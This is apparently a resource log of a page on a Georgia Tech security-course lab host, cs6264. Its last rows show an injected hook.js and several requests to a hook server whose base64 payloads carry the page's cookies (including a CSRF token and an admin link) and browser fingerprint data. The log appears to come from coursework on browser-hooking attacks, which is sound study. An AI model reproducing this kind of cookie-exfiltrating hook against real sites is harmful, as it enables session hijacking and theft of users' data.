id	type	url
7ce393d479ab9d17ea6d3f3b12df4af7	Document	http://cs6264.gtisc.gatech.edu:54831/
4fb9f721cd9602953eb246ef435e6de1	Stylesheet	https://use.fontawesome.com/releases/v5.8.1/css/all.css
930baf64e8fd182ae30bbe6cb65d3b45	Stylesheet	http://cs6264.gtisc.gatech.edu:54831/static/css/bootstrap.min.css
737c218dac6b4bb866a5d905fdf4af42	Stylesheet	http://cs6264.gtisc.gatech.edu:54831/static/css/mdb.min.css
27f0193e00171608a569b341e42d829b	Image	http://cs6264.gtisc.gatech.edu:54831/media/Basketball.png
0f94df48edfd4ac84b851dd36098bef1	Stylesheet	http://cs6264.gtisc.gatech.edu:54831/static/css/style.min.css
07daf0298dfda73666124ce8013c5090	Script	http://cs6264.gtisc.gatech.edu:54831/static/js/popper.min.js
5c34852d9a2dcbe9427b35eb54849ff8	Script	http://cs6264.gtisc.gatech.edu:54831/static/js/bootstrap.min.js
734bdf975513a67432628738154f7f4c	Script	http://cs6264.gtisc.gatech.edu:54831/static/js/mdb.min.js
9c4aaacc2c07050c62f3c6ae497cd98d	Font	http://cs6264.gtisc.gatech.edu:54831/static/font/roboto/Roboto-Regular.woff2
af59e7ef98e4fad0b761c4d2e63d1329	Font	http://cs6264.gtisc.gatech.edu:54831/static/font/roboto/Roboto-Light.woff2
e2d41f72ed4815ccc40ca41a9a1de5d3	Font	http://cs6264.gtisc.gatech.edu:54831/static/font/roboto/Roboto-Bold.woff2
121c74d562a338e40f15c052a76c03e4	Script	http://cs6264.gtisc.gatech.edu:60623/hook.js
083c92f77373217509497a4cd9e491dd	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=1&pc=9&d=W3siY2lkIjowLCJyZXN1bHRzIjp7ImJyb3dzZXIud2luZG93LmNvb2tpZXMiOiJjc3JmdG9rZW49QWpRakFpbnRzUEJRQXR0Rm5rd0RyM0FNNVpWUnZTSWY7IEJFRUZIT09LPUtIYnBPMjFYYkQ1Z0R4bXRqY1ZQbGN0MzNuTHZPeFZYaVBSNVRyOEppQUdvWU5PaUpWSGhXV25IR3lFY25LRFFIZE1pc0N3WE5ONkRiS0FyOyBiYWNrX3RvX2FkbWluPWh0dHAlM0EvL2NzNjI2NC5ndGlzYy5nYXRlY2guZWR1JTNBNDI4NDUvYWRtaW4vdmlldyUzQW1vZHVsZXMvbG9hZF9tb2R1bGUlM0F1c2Vycy9lZGl0LXVzZXI&_=1763088539512
b9555dc45a759cfefbc2dcb1f10dcd4a	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=3&pc=9&d=dpbnMiOiJQREYgVmlld2VyLENocm9tZSBQREYgVmlld2VyLENocm9taXVtIFBERiBWaWV3ZXIsTWljcm9zb2Z0IEVkZ2UgUERGIFZpZXdlcixXZWJLaXQgYnVpbHQtaW4gUERGIiwiYnJvd3Nlci53aW5kb3cudGl0bGUiOiJVbmtub3duIiwiYnJvd3Nlci53aW5kb3cub3JpZ2luIjoiaHR0cDovL2NzNjI2NC5ndGlzYy5nYXRlY2guZWR1OjU0ODMxIiwiYnJvd3Nlci53aW5kb3cuaG9zdG5hbWUiOiJjczYyNjQuZ3Rpc2MuZ2F0ZWNoLmVkdSIsImJyb3dzZXIud2luZG93Lmhvc3Rwb3J0IjoiNTQ4MzEiLCJic&_=1763088539514
5e895d961e5c7303e6923deb36afdbfb	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=4&pc=9&d=m93c2VyLndpbmRvdy51cmkiOiJodHRwOi8vY3M2MjY0Lmd0aXNjLmdhdGVjaC5lZHU6NTQ4MzEvIiwiYnJvd3Nlci53aW5kb3cucmVmZXJyZXIiOiJVbmtub3duIiwiYnJvd3Nlci53aW5kb3cuc2l6ZS53aWR0aCI6MTI4MCwiYnJvd3Nlci53aW5kb3cuc2l6ZS5oZWlnaHQiOjEzMjQsImJyb3dzZXIuZGF0ZS5kYXRlc3RhbXAiOiJUaHUgTm92IDEzIDIwMjUgMjE6NDg6NTkgR01ULTA1MDAgKEVhc3Rlcm4gU3RhbmRhcmQgVGltZSkiLCJob3N0Lm9zLm5hbWUiOiJMaW51eCIsImhvc3Qub3MuZmFtaWx5Ijoi&_=1763088539515
41beb4dbfc39de679acb1368870a55c5	Script	http://cs6264.gtisc.gatech.edu:60623/dh?bh=KHbpO21XbD5gDxmtjcVPlct33nLvOxVXiPR5Tr8JiAGoYNOiJVHhWWnHGyEcnKDQHdMisCwXNN6DbKAr&sid=1&pid=5&pc=9&d=TGludXgiLCJob3N0Lm9zLmFyY2giOjY0LCJob3N0LnNvZnR3YXJlLmRlZmF1bHRicm93c2VyIjoiVW5rbm93biIsImhhcmR3YXJlLnR5cGUiOiJVbmtub3duIiwiaGFyZHdhcmUubWVtb3J5IjoidW5rbm93biIsImhhcmR3YXJlLmdwdSI6IkFOR0xFIChJbnRlbCwgTWVzYSBJbnRlbChSKSBJcmlzKFIpIFhlIEdyYXBoaWNzIChBREwgR1QyKSwgT3BlbkdMIEVTIDMuMikiLCJoYXJkd2FyZS5ncHUudmVuZG9yIjoiR29vZ2xlIEluYy4gKEludGVsKSIsImhhcmR3YXJlLmNwdS5hcmNoIjoieDg2XzY0IiwiaGF&_=1763088539516
